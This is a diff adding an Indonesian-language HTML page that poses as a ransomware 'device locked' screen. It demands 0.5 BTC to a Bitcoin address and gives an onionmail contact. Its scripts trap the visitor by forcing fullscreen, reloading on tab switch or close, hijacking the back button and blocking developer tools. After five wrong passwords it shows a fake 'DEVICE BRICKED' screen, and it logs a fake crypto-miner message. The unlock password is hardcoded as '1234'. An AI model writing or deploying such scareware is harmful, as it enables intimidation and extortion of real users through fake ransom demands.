@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🔒 DEVICE LOCKED</title>
+    <style>
+        /* ===== RESET & BASE ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+
+        body {
+            background: #000;
+            color: #ff0000;
+            font-family: 'Courier New', monospace;
+            height: 100vh;
+            width: 100vw;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            cursor: default;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 99999;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* ===== LOCK SCREEN ===== */
+        .lock-screen {
+            text-align: center;
+            padding: 30px 20px;
+            border: 3px solid #ff0000;
+            border-radius: 20px;
+            background: rgba(0, 0, 0, 0.98);
+            box-shadow: 0 0 100px rgba(255, 0, 0, 0.3), inset 0 0 50px rgba(255, 0, 0, 0.1);
+            max-width: 500px;
+            width: 92%;
+            animation: glow 2s infinite alternate;
+            position: relative;
+            z-index: 100000;
+        }
+
+        @keyframes glow {
+            0% { box-shadow: 0 0 50px rgba(255, 0, 0, 0.2), inset 0 0 20px rgba(255, 0, 0, 0.05); }
+            100% { box-shadow: 0 0 150px rgba(255, 0, 0, 0.6), inset 0 0 50px rgba(255, 0, 0, 0.2); }
+        }
+
+        .lock-icon {
+            font-size: 70px;
+            animation: shake 2s infinite ease-in-out;
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: rotate(0deg) scale(1); }
+            25% { transform: rotate(10deg) scale(1.1); }
+            75% { transform: rotate(-10deg) scale(0.9); }
+        }
+
+        h1 {
+            font-size: 28px;
+            margin: 10px 0;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            text-shadow: 0 0 30px #ff0000, 0 0 60px #ff000044;
+            font-weight: 900;
+        }
+
+        .sub {
+            color: #ff4444;
+            font-size: 14px;
+            margin: 15px 0 25px 0;
+            border-top: 1px solid #ff000033;
+            border-bottom: 1px solid #ff000033;
+            padding: 12px 0;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            font-weight: bold;
+        }
+
+        .input-area {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            align-items: center;
+        }
+
+        input {
+            background: #0a0000;
+            border: 2px solid #ff0000;
+            color: #ff0000;
+            padding: 14px 20px;
+            font-size: 28px;
+            text-align: center;
+            width: 220px;
+            border-radius: 12px;
+            outline: none;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 10px;
+            transition: 0.3s;
+            caret-color: #ff0000;
+        }
+
+        input:focus {
+            border-color: #ff4444;
+            box-shadow: 0 0 40px #ff000066, inset 0 0 20px #ff000033;
+            background: #0f0000;
+        }
+
+        input::placeholder {
+            color: #ff000055;
+            letter-spacing: 3px;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        button {
+            background: #ff0000;
+            color: #000;
+            border: none;
+            padding: 14px 40px;
+            font-size: 18px;
+            font-weight: 900;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            font-family: 'Courier New', monospace;
+            width: 220px;
+            box-shadow: 0 0 30px #ff000044;
+        }
+
+        button:hover {
+            background: #ff2222;
+            transform: scale(1.05);
+            box-shadow: 0 0 60px #ff0000;
+        }
+
+        button:active {
+            transform: scale(0.95);
+            background: #cc0000;
+        }
+
+        .error {
+            color: #ff4444;
+            font-size: 14px;
+            height: 28px;
+            margin-top: 8px;
+            font-weight: bold;
+            text-shadow: 0 0 15px #ff0000;
+            min-height: 28px;
+        }
+
+        .error.success {
+            color: #00ff00;
+            text-shadow: 0 0 15px #00ff00;
+        }
+
+        .btc {
+            margin-top: 25px;
+            padding: 14px;
+            border: 1px dashed #ff000066;
+            color: #ff6666;
+            font-size: 12px;
+            background: #0a0000;
+            border-radius: 10px;
+            line-height: 1.8;
+        }
+
+        .btc span {
+            color: #ff0000;
+            font-weight: bold;
+            font-size: 13px;
+            word-break: break-all;
+        }
+
+        .btc small {
+            color: #ff000066;
+            display: block;
+            margin-top: 5px;
+        }
+
+        .progress {
+            margin-top: 20px;
+            width: 100%;
+            height: 4px;
+            background: #1a0000;
+            border-radius: 4px;
+            overflow: hidden;
+            opacity: 0.6;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: #ff0000;
+            border-radius: 4px;
+            animation: loading 10s infinite linear;
+        }
+
+        @keyframes loading {
+            0% { width: 0%; }
+            50% { width: 70%; }
+            100% { width: 100%; }
+        }
+
+        @media (max-width: 480px) {
+            .lock-screen { padding: 20px 15px; border-width: 2px; border-radius: 15px; }
+            .lock-icon { font-size: 50px; }
+            h1 { font-size: 22px; letter-spacing: 2px; }
+            input { font-size: 22px; width: 180px; padding: 12px 15px; letter-spacing: 8px; }
+            button { font-size: 16px; width: 180px; padding: 12px 20px; }
+            .sub { font-size: 12px; padding: 10px 0; }
+            .btc { font-size: 11px; padding: 10px; }
+        }
+
+        @media (max-width: 360px) {
+            .lock-screen { padding: 15px 10px; }
+            input { font-size: 18px; width: 150px; padding: 10px 12px; }
+            button { font-size: 14px; width: 150px; padding: 10px 15px; }
+            h1 { font-size: 18px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== LOCK SCREEN ===== -->
+    <div class="lock-screen" id="lockScreen">
+        <div class="lock-icon">🔥</div>
+        <h1>DEVICE LOCKED</h1>
+        <div class="sub">⚠️ AKTIVITAS ILEGAL TERDETEKSI ⚠️</div>
+
+        <div class="input-area">
+            <input type="password" id="passInput" placeholder="MASUKAN PASSWORD" maxlength="10" autofocus>
+            <button id="unlockBtn">UNLOCK</button>
+            <div class="error" id="errorMsg">🔑</div>
+        </div>
+
+        <div class="btc">
+            💰 BAYAR 0.5 BTC KE: <span>1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</span>
+            <small>Password akan dikirim setelah pembayaran</small>
+        </div>
+
+        <div class="progress">
+            <div class="progress-bar"></div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        //  KONFIGURASI
+        // ============================================================
+        const CORRECT_PASS = "1234";
+        const MAX_ATTEMPTS = 5;
+        let attempts = 0;
+        let isLocked = false;
+        let isUnlocked = false;
+
+        // ============================================================
+        //  ELEMEN
+        // ============================================================
+        const input = document.getElementById('passInput');
+        const error = document.getElementById('errorMsg');
+        const lockScreen = document.getElementById('lockScreen');
+        const unlockBtn = document.getElementById('unlockBtn');
+
+        // ============================================================
+        //  FUNGSI UNLOCK
+        // ============================================================
+        function unlock() {
+            if (isLocked || isUnlocked) return;
+
+            const pass = input.value.trim();
+
+            if (pass === '') {
+                error.textContent = '⚠️ MASUKAN PASSWORD!';
+                error.className = 'error';
+                input.focus();
+                return;
+            }
+
+            if (pass === CORRECT_PASS) {
+                isUnlocked = true;
+                error.textContent = '✅ ACCESS GRANTED!';
+                error.className = 'error success';
+                input.disabled = true;
+                unlockBtn.disabled = true;
+
+                document.body.style.background = '#001a00';
+                lockScreen.style.borderColor = '#00ff00';
+                lockScreen.style.boxShadow = '0 0 100px rgba(0,255,0,0.5)';
+                lockScreen.querySelector('h1').textContent = '🔓 UNLOCKED';
+                lockScreen.querySelector('.sub').textContent = '✅ SELAMAT DATANG KEMBALI';
+                lockScreen.querySelector('.lock-icon').textContent = '✅';
+                lockScreen.querySelector('.btc').style.display = 'none';
+                lockScreen.querySelector('.progress').style.display = 'none';
+                document.querySelector('.lock-icon').style.animation = 'none';
+
+                // HENTIKAN ANTI-CLOSE
+                stopAntiClose();
+
+                setTimeout(() => {
+                    alert('🔓 DEVICE UNLOCKED!\nPassword: 1234');
+                }, 300);
+
+                return;
+            }
+
+            attempts++;
+            error.className = 'error';
+            error.textContent = `❌ PASSWORD SALAH! (${attempts}/${MAX_ATTEMPTS})`;
+            input.value = '';
+            input.focus();
+
+            lockScreen.style.borderColor = '#ff0000';
+            lockScreen.style.boxShadow = '0 0 200px rgba(255,0,0,0.8)';
+            setTimeout(() => {
+                lockScreen.style.boxShadow = '0 0 100px rgba(255,0,0,0.3)';
+            }, 400);
+
+            if (attempts >= MAX_ATTEMPTS) {
+                isLocked = true;
+                error.textContent = '💀 PERMANENT LOCK! RESTART REQUIRED';
+                error.style.color = '#ff0000';
+                error.style.fontSize = '16px';
+                input.disabled = true;
+                unlockBtn.disabled = true;
+
+                document.body.innerHTML = `
+                    <div style="
+                        background: #000;
+                        color: #ff0000;
+                        height: 100vh;
+                        width: 100vw;
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        flex-direction: column;
+                        font-family: 'Courier New', monospace;
+                        position: fixed;
+                        top: 0;
+                        left: 0;
+                        z-index: 999999;
+                        background: radial-gradient(circle, #0a0000, #000);
+                    ">
+                        <div style="font-size: 80px; animation: shake 1.5s infinite;">💀</div>
+                        <h1 style="font-size: 32px; text-transform: uppercase; letter-spacing: 5px; text-shadow: 0 0 50px #ff0000;">DEVICE BRICKED</h1>
+                        <p style="color: #ff4444; margin-top: 20px; font-size: 18px;">Hubungi Gransdraknet untuk recovery</p>
+                        <p style="color: #ff000066; font-size: 12px; margin-top: 40px; letter-spacing: 2px;">GRANSDRANKNET v3.1 - NO ESCAPE</p>
+                        <div style="margin-top: 30px; color: #ff000044; font-size: 11px; max-width: 300px; text-align: center; border-top: 1px solid #ff000022; padding-top: 20px;">
+                            🔒 This device has been permanently locked for security reasons.<br>
+                            Contact: gransdraknet@onionmail.org
+                        </div>
+                    </div>
+                    <style>
+                        @keyframes shake {
+                            0%, 100% { transform: rotate(0deg) scale(1); }
+                            25% { transform: rotate(5deg) scale(1.05); }
+                            75% { transform: rotate(-5deg) scale(0.95); }
+                        }
+                    </style>
+                `;
+                document.body.style.pointerEvents = 'none';
+                document.body.style.userSelect = 'none';
+            }
+        }
+
+        // ============================================================
+        //  ANTI-CLOSE MECHANISM
+        // ============================================================
+        function startAntiClose() {
+            // 1. FULLSCREEN FORCED
+            function forceFullscreen() {
+                if (!document.fullscreenElement && !isUnlocked) {
+                    document.documentElement.requestFullscreen?.().catch(() => {});
+                }
+            }
+
+            document.addEventListener('click', forceFullscreen);
+            document.addEventListener('touchstart', forceFullscreen);
+            document.addEventListener('keydown', forceFullscreen);
+
+            // 2. VISIBILITY API - KALO PINDAH TAB, KEMBALI LAGI
+            document.addEventListener('visibilitychange', function() {
+                if (document.hidden && !isUnlocked) {
+                    // Redirect balik ke halaman ini
+                    setTimeout(() => {
+                        if (!isUnlocked) {
+                            window.location.reload();
+                        }
+                    }, 100);
+                }
+            });
+
+            // 3. BEFOREUNLOAD - CEK KALO MAU CLOSE TAB
+            window.addEventListener('beforeunload', function(e) {
+                if (!isUnlocked) {
+                    e.preventDefault();
+                    e.returnValue = '';
+                    // Popunder
+                    open('', '_self');
+                    window.location.href = window.location.href;
+                }
+            });
+
+            // 4. POPSTATE (BACK BUTTON)
+            window.addEventListener('popstate', function() {
+                if (!isUnlocked) {
+                    history.pushState(null, '', window.location.href);
+                    window.location.reload();
+                }
+            });
+
+            // 5. PUSH STATE (biar back ga jalan)
+            history.pushState(null, '', window.location.href);
+            window.addEventListener('load', function() {
+                history.pushState(null, '', window.location.href);
+            });
+
+            // 6. PAGEHIDE (buat mobile)
+            window.addEventListener('pagehide', function(e) {
+                if (!isUnlocked) {
+                    setTimeout(() => {
+                        if (!isUnlocked) {
+                            window.location.reload();
+                        }
+                    }, 50);
+                }
+            });
+
+            // 7. UNLOAD (extra layer)
+            window.addEventListener('unload', function(e) {
+                if (!isUnlocked) {
+                    // Kirim ke blank
+                    window.open('', '_blank');
+                }
+            });
+
+            // 8. BLOCK CLOSE WITH CONFIRM (looping)
+            setInterval(function() {
+                if (!isUnlocked && document.hidden) {
+                    window.location.reload();
+                }
+            }, 500);
+        }
+
+        function stopAntiClose() {
+            // Hapus semua listener
+            window.removeEventListener('beforeunload', null);
+            window.removeEventListener('popstate', null);
+            window.removeEventListener('pagehide', null);
+            window.removeEventListener('unload', null);
+            document.removeEventListener('visibilitychange', null);
+            // Keluar fullscreen
+            if (document.fullscreenElement) {
+                document.exitFullscreen?.();
+            }
+        }
+
+        // ============================================================
+        //  EVENT LISTENER
+        // ============================================================
+        input.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                unlock();
+            }
+        });
+
+        unlockBtn.addEventListener('click', unlock);
+
+        window.addEventListener('load', function() {
+            setTimeout(() => input.focus(), 300);
+            startAntiClose();
+            // Push state biar back ga jalan
+            history.pushState(null, '', window.location.href);
+        });
+
+        // ============================================================
+        //  ANTI INSPECT
+        // ============================================================
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        document.addEventListener('keydown', function(e) {
+            const ctrl = e.ctrlKey || e.metaKey;
+            const shift = e.shiftKey;
+
+            if (e.key === 'F12' ||
+                (ctrl && shift && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+                (ctrl && e.key === 'U') ||
+                (ctrl && shift && e.key === 'K') ||
+                (ctrl && shift && e.key === 'M')) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }
+        });
+
+        // ============================================================
+        //  FAKE CRYPTO MINER
+        // ============================================================
+        function fakeMining() {
+            console.log('%c🔥 Gransdraknet Mining Active 🔥', 'color: #ff0000; font-size: 16px; font-weight: bold;');
+            let hash = '';
+            for (let i = 0; i < 100; i++) {
+                hash += Math.random().toString(36).substring(2, 15);
+            }
+            console.log(`Hash: ${hash.substring(0, 64)}...`);
+        }
+        setInterval(fakeMining, 8000);
+
+        console.log('%c🔒 DEVICE LOCK ACTIVE - ANTI CLOSE ENABLED', 'color: #ff0000; font-size: 20px; font-weight: bold;');
+        console.log('%cPassword: 1234', 'color: #ff4444; font-size: 14px;');
+        console.log('%c⚠️ 5 attempts = BRICK', 'color: #ff6666; font-size: 12px;');
+    </script>
+
+</body>
+</html>
